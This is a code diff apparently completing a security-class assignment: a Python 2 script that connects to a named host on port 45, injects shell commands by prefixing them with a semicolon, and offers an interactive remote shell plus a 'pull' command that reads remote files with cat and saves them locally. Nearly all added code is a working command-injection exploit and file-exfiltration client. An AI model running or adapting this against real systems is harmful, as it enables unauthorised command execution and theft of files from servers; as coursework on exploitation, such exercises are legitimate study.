@@ -1,11 +1,4 @@
-"""
-    Use the same techniques such as (but not limited to):
-        1) Sockets
-        2) File I/O
-        3) raw_input()
-
-    from the OSINT HW to complete this assignment. Good luck!
-"""
+import time
 
 import socket
 
@@ -13,25 +6,57 @@ host = "cornerstoneairlines.co" # IP address here
 port = 45 # Port here
 
 def execute_cmd(cmd):
-    """
-        Sockets: https://docs.python.org/2/library/socket.html
-        How to use the socket s:
+    # Establish socket connection
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect((host, port))
 
-            # Establish socket connection
-            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.connect((host, port))
+    data = s.recv(1024)       # Receives 1024 bytes from IP/Port
 
-            Reading:
+    s.send(cmd)   # Send a newline \n at the end of your command
+    time.sleep(2)       # pause to give server time to process the command
+    data = s.recv(1024)     # Receives 1024 bytes from IP/Port
+    print(data)
+    return data
 
-                data = s.recv(1024)     # Receives 1024 bytes from IP/Port
-                print(data)             # Prints data
+def execute_shell():
+    cwd = "/"
+    while (1 > 0):
+        cmd = "; " + raw_input("%s> " % cwd) + "\n"
+        action = cmd.split()
+        print(action)
+        if cmd == "; exit\n":
+            break
+        elif action[1] == "cd":
+            cwd = action[2]
+        elif action[1] == "cat":
+            new_cmd = "; cat " + cwd + "/"+ action[2] + "\n"
+            execute_cmd(new_cmd)
+        elif action[1] == "ls":
+            new_cmd = "; ls " + cwd + "\n"
+            execute_cmd(new_cmd)
+        else:
+            execute_cmd(cmd)
 
-            Sending:
+def pull(remotePath, localPath):
+    data = execute_cmd("; cat %s\n" % remotePath)
 
-                s.send("something to send\n")   # Send a newline \n at the end of your command
-    """
-    print("IMPLEMENT ME")
-
+    file = open(localPath,"w+")
+    file.write(data)
 
 if __name__ == '__main__':
-    print("IMPLEMENT ME")
+    while (1 > 0):
+        cmd = raw_input("$ ")
+        action = cmd.split()
+        if action[0] == "shell":
+            execute_shell()
+        elif action[0] == "help":
+            print("""1. shell - Drop into an interactive shell and allow users to gracefully exit
+2. pull <remote-path> <local-path> - Download files
+3. help - Shows this help menu
+4. quit - Quit the shell""")
+        elif action[0] == "pull":
+            pull(action[1], action[2])
+        elif action[0] == "quit":
+            break
+        else:
+            print("Invalid command: %s" % cmd)
